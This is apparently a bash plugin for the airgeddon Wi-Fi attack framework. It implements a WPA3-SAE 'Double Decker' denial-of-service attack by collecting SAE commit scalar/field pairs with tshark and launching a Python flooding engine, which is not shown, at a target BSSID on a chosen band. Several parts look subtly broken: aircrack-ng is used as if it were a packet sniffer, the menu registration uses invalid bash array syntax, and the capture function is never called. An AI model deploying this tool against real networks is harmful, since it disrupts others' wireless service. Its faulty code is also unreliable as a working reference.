#!/bin/bash
# airgeddon plugin: WPA3 Double Decker DoS (Omnivore + Muted bursts)
# Author: Nuseo1
# Minimum airgeddon version: 12.0

plugin_name="Double Decker Attack"
plugin_description="WPA3-SAE Double Decker DoS attack (Omnivore + Muted bursts)"
plugin_minimum_ag_affected_version="12.0"
plugin_script="double_decker_attack.py"
plugin_distros_supported=("Kali" "Parrot" "Wifislax" "BlackArch")

# -----------------------------------------------------------------------------
# Helper – calculate frequency using band (airgeddon >= v12.0)
# -----------------------------------------------------------------------------
function double_decker_get_frequency() {
    local ch="$1"
    local band="$2"
    local freq

    if [[ "$band" == "2.4" ]]; then
        if (( ch == 14 )); then
            freq=2484
        else
            freq=$(( 2407 + ch * 5 ))
        fi
    elif [[ "$band" == "5" ]]; then
        freq=$(( 5000 + ch * 5 ))
    elif [[ "$band" == "6" ]]; then
        # 6 GHz: channel 1 = 5955 MHz, then 5 MHz steps
        freq=$(( 5955 + (ch - 1) * 5 ))
    else
        # Fallback to 2.4 GHz calculation
        freq=$(( 2407 + ch * 5 ))
    fi
    echo "$freq"
}

# -----------------------------------------------------------------------------
# Set interface to target frequency using iw
# -----------------------------------------------------------------------------
function double_decker_set_interface_freq() {
    local freq
    freq=$(double_decker_get_frequency "${channel}" "${band}")
    iw dev "${interface}" set freq "${freq}" > /dev/null 2>&1
    if [[ $? -ne 0 ]]; then
        echo "ERROR: Could not set frequency ${freq} MHz on ${interface}"
        return 1
    fi
    return 0
}

# -----------------------------------------------------------------------------
# Plugin prehook – executed before the attack
# -----------------------------------------------------------------------------
function double_decker_attack_prehook() {
    # Ensure the second interface is available for SAE capture
    if [[ -z "${second_interface}" ]]; then
        echo "ERROR: A second Wi-Fi interface is required for SAE commit capture."
        echo "Please plug in a second adapter and restart the plugin."
        return 1
    fi
    return 0
}

# -----------------------------------------------------------------------------
# Plugin main function – launch the Python engine
# -----------------------------------------------------------------------------
function double_decker_attack_launch() {
    # Validate required environment variables (set by airgeddon)
    if [[ -z "${target_bssid}" ]] || [[ -z "${channel}" ]] || [[ -z "${band}" ]]; then
        echo "ERROR: Missing target information (BSSID, channel, band)."
        return 1
    fi

    # Collect SAE commit pairs from capture file
    local pairs_file="${tmpdir}airgeddon_double_decker_pairs.txt"
    if [[ ! -f "${pairs_file}" ]]; then
        echo "ERROR: SAE pairs file not found. Run capture step first."
        return 1
    fi
    local sae_pairs
    sae_pairs=$(cat "${pairs_file}")
    if [[ -z "${sae_pairs}" ]]; then
        echo "No SAE pairs captured – attack may be ineffective."
    fi

    # Set the primary interface to the target channel
    if ! double_decker_set_interface_freq; then
        return 1
    fi

    # Start the Python engine with full parameters
    "${python_cmd}" "${plugins_dir}double_decker_attack.py" \
        --interface "${interface}" \
        --bssid "${target_bssid}" \
        --channel "${channel}" \
        --band "${band}" \
        --pairs "${sae_pairs}" \
        --language "${language}" &

    # Store PID to allow clean stop
    double_decker_attack_pid=$!
    echo "Double Decker attack started (PID: ${double_decker_attack_pid})"
    return 0
}

# -----------------------------------------------------------------------------
# Plugin posthook – cleanup after the attack
# -----------------------------------------------------------------------------
function double_decker_attack_posthook() {
    if [[ -n "${double_decker_attack_pid}" ]]; then
        kill "${double_decker_attack_pid}" 2>/dev/null
        wait "${double_decker_attack_pid}" 2>/dev/null
        echo "Double Decker attack stopped."
    fi
    # Remove temporary capture files
    rm -f "${tmpdir}airgeddon_double_decker_capture.cap" \
          "${tmpdir}airgeddon_double_decker_pairs.txt"
}

# -----------------------------------------------------------------------------
# Capture SAE commit frames (second adapter required)
# -----------------------------------------------------------------------------
function double_decker_capture_sae_pairs() {
    local cap_iface="$1"
    local cap_file="${tmpdir}airgeddon_double_decker_capture.cap"
    local pairs_file="${tmpdir}airgeddon_double_decker_pairs.txt"

    echo "Starting SAE commit capture on interface ${cap_iface}..."
    if [[ ! -d "${tmpdir}" ]]; then
        mkdir -p "${tmpdir}"
    fi

    # Short sniff to collect SAE commit frames (up to 15 seconds)
    timeout 15 "${aircrack_bin}" -w /dev/null -b "${target_bssid}" "${cap_file}" &> /dev/null || true

    # Extract scalar/field pairs using tshark (requires tshark installed)
    if command -v tshark &> /dev/null; then
        tshark -r "${cap_file}" \
            -Y "wlan.fc.type_subtype == 0x0b && wlan.addr == ${target_bssid}" \
            -T fields -e wlan.sae.scalar -e wlan.sae.field 2>/dev/null | \
            head -n 20 | awk -F'\t' '{ if ($1 && $2) print $1":"$2 }' > "${pairs_file}"
        local pair_count
        pair_count=$(wc -l < "${pairs_file}")
        echo "${pair_count} SAE pairs captured."
    else
        echo "tshark not found – cannot parse SAE pairs. Please install tshark."
        return 1
    fi
}

# -----------------------------------------------------------------------------
# Plugin registration in airgeddon's menu
# -----------------------------------------------------------------------------
function initialize_double_decker_attack() {
    # Register the plugin menu entry inside the "Attacks" submenu
    airgeddon_plugin_menu["${plugin_name}"]=(
        "plugin_name=${plugin_name}"
        "plugin_description=${plugin_description}"
        "plugin_script=${plugin_script}"
        "plugin_function=double_decker_attack_launch"
        "plugin_prehook=double_decker_attack_prehook"
        "plugin_posthook=double_decker_attack_posthook"
        "plugin_distros_supported=${plugin_distros_supported[*]}"
    )
}

# -----------------------------------------------------------------------------
# Stop function called when user interrupts or attack finishes
# -----------------------------------------------------------------------------
function stop_double_decker_attack() {
    double_decker_attack_posthook
}

# -----------------------------------------------------------------------------
# Activate plugin
# -----------------------------------------------------------------------------
initialize_double_decker_attack